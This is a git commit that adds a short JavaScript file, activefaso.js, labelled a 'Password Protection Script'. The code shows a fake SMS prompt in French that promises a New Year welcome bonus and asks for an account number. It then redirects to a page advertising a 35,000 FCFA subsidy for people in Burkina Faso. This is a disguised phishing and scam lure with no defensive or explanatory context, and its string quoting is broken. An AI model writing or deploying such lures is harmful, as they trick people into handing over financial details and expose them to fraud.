5fc3b0997f7a8df03589c8c5a2f9cbe36d2b53bc
ita-giftt <tallaakoti@gmail.com>
2026-02-05 12:03:49 +0100

    Create activefaso.js

---
+++ activefaso.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L'ARGENT'
+password = prompt(
+  'SMS : Félicitations ! Vous avez droit à la prime de bienvenue pour le Nouvel An. Veuillez appuyer sur OK pour saisir votre numéro de compte.',
+  'RETIRER DE L'ARGENT'
+);
+if (password != 'RETIRER DE L'ARGENT') {
+  location.href = 'https://rward.info/Subvention-35000FCFA-Burkinabe.html';
+}
